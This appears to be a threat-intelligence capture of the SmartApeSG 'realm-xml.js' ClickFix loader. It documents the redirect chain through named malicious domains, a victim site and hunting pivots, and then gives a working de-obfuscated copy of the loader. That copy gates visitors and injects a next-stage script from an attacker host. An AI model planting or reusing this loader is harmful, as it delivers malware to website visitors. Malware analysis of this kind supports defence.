/*
 * SmartApeSG - realm-xml.js loader
 *
 * Classification:
 *   smartapesg
 *   clickfix
 *   compromise
 *   tds
 *   loader
 *
 * Captured:
 *   2026-08-23
 *
 * Observed redirect chain:
 *
 *   compromised site
 *       |
 *       +-> edcardaruba.us/gfont.ttf
 *             |
 *             +-> trunestgroup.com/gfont.ttf
 *                   |
 *                   +-> umbernarthex.info
 *                         |
 *                         +-> /identity/realm-xml.js
 *                               |
 *                               +-> desktop gate
 *                               +-> 24-hour visitor gate
 *                               +-> decode hidden URL
 *                               |
 *                               +-> /identity/role-template?<random8>
 *
 *
 * Observed victim:
 *
 *   insidegnss.com
 *
 * The same realm-xml.js loader pattern is used by SmartApeSG.
 *
 * Published SmartApeSG captures using the same loader continue:
 *
 *   /identity/realm-xml.js
 *       |
 *       +-> /identity/role-template?<random8>
 *             |
 *             +-> /identity/secure-theme.js?<token>
 *                   |
 *                   +-> ClickFix
 *
 * The umbernarthex.info role-template endpoint returned HTTP 504 during
 * analysis, so secure-theme.js was not observed from this specific host.
 *
 *
 * Visitor gating:
 *
 *   Android
 *       -> stop
 *
 *   iPhone
 *       -> stop
 *
 *   desktop
 *       -> continue
 *
 *   localStorage["hus_part"]
 *       -> one delivery per 24 hours
 *
 * Before loading the next stage:
 *
 *   localStorage.removeItem("cf-used-at")
 *
 *
 * Hidden URL:
 *
 *   https://umbernarthex.info/identity/role-template?
 *
 * The original reconstructs this URL from XOR-obfuscated hexadecimal
 * fragments using:
 *
 *   sec_draw
 *
 * An eight-character alphanumeric value is appended directly after "?".
 *
 * Example shape:
 *
 *   https://umbernarthex.info/identity/role-template?A1b2C3d4
 *
 *
 * Infrastructure:
 *
 *   edcardaruba.us/gfont.ttf
 *       observed redirect hop
 *
 *   trunestgroup.com/gfont.ttf
 *       observed redirect hop
 *
 *   umbernarthex.info
 *       SmartApeSG delivery infrastructure
 *
 *   /identity/realm-xml.js
 *       visitor qualification / loader
 *
 *   /identity/role-template?
 *       dynamic next-stage endpoint
 *
 *
 * Useful pivots:
 *
 *   realm-xml.js
 *   role-template
 *   secure-theme.js
 *   /identity/realm-xml.js
 *   /identity/role-template?
 *   hus_part
 *   cf-used-at
 *   sec_draw
 *
 * Useful search:
 *
 *   filename:"role-template" AND filename:"realm-xml.js"
 *
 *
 * ## Normalized
 */

(() => {
    "use strict";

    const VISITOR_KEY =
        "hus_part";

    const CLOUDFLARE_STATE_KEY =
        "cf-used-at";

    const VISITOR_TTL =
        24 * 60 * 60 * 1000;

    const NONCE_ALPHABET =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
        "abcdefghijklmnopqrstuvwxyz" +
        "0123456789";

    /*
     * XOR-hidden in the original with key:
     *
     *   sec_draw
     */
    const NEXT_STAGE =
        "https://umbernarthex.info" +
        "/identity/role-template?";

    /*
     * Generate the eight-character value appended directly to the
     * role-template query string.
     */
    function randomString(
        length
    ) {
        let result = "";

        for (
            let index = 0;
            index < length;
            index++
        ) {
            result +=
                NONCE_ALPHABET.charAt(
                    Math.floor(
                        Math.random() *
                        NONCE_ALPHABET.length
                    )
                );
        }

        return result;
    }

    /*
     * Return true when this visitor has already been processed during
     * the previous 24 hours.
     */
    function recentlyVisited() {
        const stored =
            localStorage.getItem(
                VISITOR_KEY
            );

        const now =
            Date.now();

        if (
            !stored ||
            now - parseInt(
                stored,
                10
            ) > VISITOR_TTL
        ) {
            localStorage.setItem(
                VISITOR_KEY,
                now.toString()
            );

            return false;
        }

        return true;
    }

    /*
     * Mobile visitors are excluded from this delivery branch.
     */
    function isMobile() {
        return (
            /Android|iPhone/i
                .test(
                    navigator.userAgent
                )
        );
    }

    /*
     * Active delivery method in the captured sample.
     */
    function injectScript(
        url
    ) {
        const script =
            document.createElement(
                "script"
            );

        script.src =
            url;

        document.body.appendChild(
            script
        );
    }

    /*
     * The original also contains a full-screen iframe creation helper.
     * The active realm-xml.js path uses script injection.
     */
    function injectFullscreenIframe(
        url
    ) {
        const iframe =
            document.createElement(
                "iframe"
            );

        iframe.style.cssText =
            "width:100%;" +
            "height:100%;" +
            "position:fixed;" +
            "top:0;" +
            "left:0;" +
            "z-index:9999;" +
            "border:none;";

        iframe.src =
            url;

        document.body.appendChild(
            iframe
        );
    }

    function run() {
        const nonce =
            randomString(8);

        const nextStage =
            NEXT_STAGE +
            nonce;

        if (
            recentlyVisited()
        ) {
            return;
        }

        localStorage.removeItem(
            CLOUDFLARE_STATE_KEY
        );

        if (
            isMobile()
        ) {
            return;
        }

        injectScript(
            nextStage
        );
    }

    if (
        document.readyState ===
        "loading"
    ) {
        document.addEventListener(
            "DOMContentLoaded",
            run
        );
    } else {
        run();
    }

    void injectFullscreenIframe;
})();


/*
 * Original behavioral constants
 *
 * Visitor state:
 *
 *   hus_part
 *
 * TTL:
 *
 *   24 * 60 * 60 * 1000
 *
 * State removed:
 *
 *   cf-used-at
 *
 * URL XOR key:
 *
 *   sec_draw
 *
 * Decoded URL:
 *
 *   https://umbernarthex.info/identity/role-template?
 *
 * Nonce:
 *
 *   8 alphanumeric characters
 *
 * Mobile exclusion:
 *
 *   /Android|iPhone/i
 *
 * Delivery:
 *
 *   document.createElement("script")
 *   script.src = decodedUrl + randomString(8)
 *   document.body.appendChild(script)
 */
